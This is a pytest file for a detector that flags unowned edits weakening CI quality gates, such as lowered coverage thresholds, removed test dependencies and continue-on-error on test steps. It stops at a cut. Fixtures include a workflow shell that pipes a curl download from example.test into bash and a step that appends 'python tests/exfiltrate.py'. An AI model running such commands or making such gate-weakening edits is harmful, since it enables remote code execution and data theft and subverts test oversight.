"""Tests for protected quality-gate file detection."""

from __future__ import annotations

import pytest

from awf.control import quality_gates as quality_gate_module
from awf.control.quality_gates import (
    ProtectedFileDiff,
    changed_paths_are_only_internal_plan_artifacts,
    diff_classified_protected_paths,
    find_protected_quality_gate_changes,
    plan_only_output_message,
    protected_quality_gate_pattern,
    quality_gate_violation_details,
    quality_gate_violation_message,
    requires_protected_file_diff,
)


@pytest.mark.unit
def test_unowned_workspace_profile_change_is_protected() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[".awf/workspace.yml", "src/awf/runtime/validation.py"],
        owned_paths=["src/awf/runtime/**"],
    )

    assert [violation.path for violation in violations] == [".awf/workspace.yml"]


@pytest.mark.unit
def test_unowned_pyproject_change_is_protected() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=["tests/unit/**"],
    )

    assert [violation.path for violation in violations] == ["pyproject.toml"]


@pytest.mark.unit
def test_explicit_ownership_allows_quality_gate_change() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml", ".github/workflows/ci.yml"],
        owned_paths=["pyproject.toml", ".github/workflows/**"],
    )

    assert violations == []


@pytest.mark.unit
def test_regular_source_changes_are_not_protected() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[
            "   ",
            "./src/awf/control/executor.py",
            "tests/unit/control/test_executor.py",
        ],
        owned_paths=[],
    )

    assert violations == []


@pytest.mark.unit
def test_diff_classified_protected_paths_normalizes_and_deduplicates() -> None:
    paths = diff_classified_protected_paths(
        [
            " ./pyproject.toml ",
            ".\\.github\\workflows\\ci.yml",
            "./.github/workflows/ci.yml",
            "src/awf/control/executor.py",
            " ",
        ]
    )

    assert paths == ("pyproject.toml", ".github/workflows/ci.yml")


@pytest.mark.unit
def test_pyproject_dependency_addition_is_allowed() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
    "httpx>=0.27.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_lower_coverage_fail_under_is_blocked() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 80
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage.report.fail_under"
    assert violation.line == 5
    assert "lowered from 99 to 80" in violation.reason


@pytest.mark.unit
def test_pyproject_raising_coverage_fail_under_is_blocked_with_explicit_policy_reason() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 80
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage.report.fail_under"
    assert violation.line == 5
    assert violation.reason == (
        "coverage fail_under raised from 80 to 99 "
        "(policy change requires ownership of pyproject.toml)"
    )


@pytest.mark.unit
def test_pyproject_non_numeric_coverage_fail_under_change_is_blocked() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = "99"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage.report.fail_under"
    assert violation.line == 5
    assert "coverage fail_under changed from 99 to '99'" in violation.reason
    assert "must remain numeric" in violation.reason


@pytest.mark.unit
def test_pyproject_unchanged_coverage_fail_under_policy_change_is_specific() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = true
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage"
    assert violation.line == 4
    assert "coverage fail_under unchanged at 99 while coverage policy changed" in violation.reason


@pytest.mark.unit
def test_pyproject_fail_under_change_reports_other_coverage_policy_changes() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = true
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 80
show_missing = false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == [
        "tool.coverage.report.fail_under",
        "tool.coverage",
    ]
    assert [violation.line for violation in violations] == [5, 4]
    assert "coverage fail_under lowered from 99 to 80" in violations[0].reason
    assert violations[1].reason == "protected pyproject policy section changed: tool.coverage"


@pytest.mark.unit
def test_pyproject_reports_all_unknown_top_level_section_changes() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[custom]
enabled = true

[scripts]
lint = "ruff check ."
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == ["custom", "scripts"]
    assert [violation.line for violation in violations] == [4, 7]
    assert [violation.reason for violation in violations] == [
        "pyproject section changed outside allowed metadata/dependency edits: custom",
        "pyproject section changed outside allowed metadata/dependency edits: scripts",
    ]


@pytest.mark.unit
def test_pyproject_reports_all_unknown_project_key_changes() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[project.scripts]
awf = "awf.cli:app"

[project.entry-points]
awf = { hook = "awf.hooks:main" }
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == [
        "project.entry-points",
        "project.scripts",
    ]
    assert [violation.line for violation in violations] == [7, 4]
    assert [violation.reason for violation in violations] == [
        ("pyproject project section changed outside allowed metadata: project.entry-points"),
        "pyproject project section changed outside allowed metadata: project.scripts",
    ]


@pytest.mark.unit
def test_pyproject_reports_all_unknown_tool_section_changes() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[tool.black]
line-length = 88

[tool.isort]
profile = "black"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == ["tool.black", "tool.isort"]
    assert [violation.line for violation in violations] == [4, 7]
    assert [violation.reason for violation in violations] == [
        "pyproject tool section changed outside allowed edits: tool.black",
        "pyproject tool section changed outside allowed edits: tool.isort",
    ]


@pytest.mark.unit
def test_pyproject_dependency_deletion_is_blocked() -> None:
    old_text = """
[project.optional-dependencies]
dev = [
    "pytest>=8.0.0",
    "pytest-cov>=5.0.0",
]
""".strip()
    new_text = """
[project.optional-dependencies]
dev = [
    "pytest>=8.0.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "project.optional-dependencies.dev"
    assert "dependency removed: pytest-cov" in violations[0].reason


@pytest.mark.unit
def test_pyproject_dependency_pep503_normalization_prevents_removed_violation() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "zope.interface>=6.0.0",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "zope-interface>=6.0.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "project.dependencies"
    assert violations[0].reason == "dependency changed: zope-interface"


@pytest.mark.unit
def test_pyproject_duplicate_dependency_entry_deletion_is_blocked() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "urllib3>=2.0.0; python_version >= '3.11'",
    "urllib3>=1.26.0; python_version < '3.11'",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "urllib3>=1.26.0; python_version < '3.11'",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "project.dependencies"
    assert violation.line == 4
    assert "dependency removed: urllib3" in violation.reason


@pytest.mark.unit
def test_pyproject_marker_dependency_changes_are_deduplicated_by_name() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.0.0; python_version >= '3.11'",
    "requests>=1.26.0; python_version < '3.11'",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.1.0; python_version >= '3.11'",
    "requests>=1.27.0; python_version < '3.11'",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.reason for violation in violations] == ["dependency changed: requests"]


@pytest.mark.unit
def test_pyproject_marker_dependency_removals_are_deduplicated_by_name() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.0.0; python_version >= '3.11'",
    "requests>=1.26.0; python_version < '3.11'",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.1.0; python_version >= '3.11'",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.reason for violation in violations] == ["dependency removed: requests"]


@pytest.mark.unit
def test_pyproject_new_dependency_group_is_blocked() -> None:
    old_text = """
[dependency-groups]
dev = [
    "pytest>=8.0.0",
]
""".strip()
    new_text = """
[dependency-groups]
dev = [
    "pytest>=8.0.0",
]
lint = [
    "ruff>=0.9.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "dependency-groups.lint"
    assert violations[0].line == 5
    assert "dependency group added: dependency-groups.lint" in violations[0].reason


@pytest.mark.unit
def test_pyproject_unchanged_pep735_include_group_is_not_revalidated() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
]

[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
    "httpx>=0.27.0",
]

[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_unchanged_unsupported_project_dependencies_are_not_revalidated() -> None:
    old_text = """
[project]
name = "demo"
description = "old"
dependencies = [
    { name = "fastapi" },
]
""".strip()
    new_text = """
[project]
name = "demo"
description = "new"
dependencies = [
    { name = "fastapi" },
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_changed_pep735_include_group_reports_evaluation_limit() -> None:
    old_text = """
[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
]
""".strip()
    new_text = """
[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
    "ruff>=0.9.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "dependency-groups.dev"
    assert violations[0].reason == (
        "dependency section contains PEP 735 include-group entries that "
        "require ownership of pyproject.toml for evaluation: dependency-groups.dev"
    )


@pytest.mark.unit
def test_workflow_comment_github_script_without_script_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_github_actions_expression_echo() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo "Tests passed on ${{ github.sha }}"
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_quoted_validation_words() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: 'echo "pytest: 3 passed, coverage: 92%"'
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_shell_comments() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: |
          # Send result
          echo "Tests passed"
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_with_custom_shell_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo pending
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 10
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_uses_only_comment_continue_on_error_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: peter-evans/create-or-update-comment@v4
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: peter-evans/create-or-update-comment@v4
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pytest_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Run pytest.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_validation_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: uv run pytest
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_unrelated_action_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/setup-python@v5
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/setup-python@v5
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_github_script_continue_on_error_with_script_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await exec.exec("uv", ["run", "pytest"]);
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        continue-on-error: true
        with:
          script: |
            await exec.exec("uv", ["run", "pytest"]);
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_github_script_continue_on_error_with_safe_script_is_allowed() -> (
    None
):
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        continue-on-error: true
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_removing_pytest_continue_on_error_true_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: true
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_setting_pytest_continue_on_error_false_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: true
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_continue_suffix", "new_continue_suffix"),
    [
        ("", "\n        continue-on-error: false"),
        ("\n        continue-on-error: false", ""),
    ],
)
def test_workflow_absent_and_false_continue_on_error_are_equivalent(
    old_continue_suffix: str,
    new_continue_suffix: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest{old_continue_suffix}
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest{new_continue_suffix}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_continue_on_error_expression_change_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: false
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: '${{ matrix.allow_failure }}'
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Run pytest.continue-on-error"
    assert "workflow continue-on-error changed outside allowed comment steps" in violation.reason


@pytest.mark.unit
def test_workflow_comment_validation_command_broadening_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml && uv run coverage html
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_validation_command_arbitrary_append_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest && bash scripts/report.sh
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
def test_workflow_comment_validation_command_python_test_script_append_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml && python tests/exfiltrate.py
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
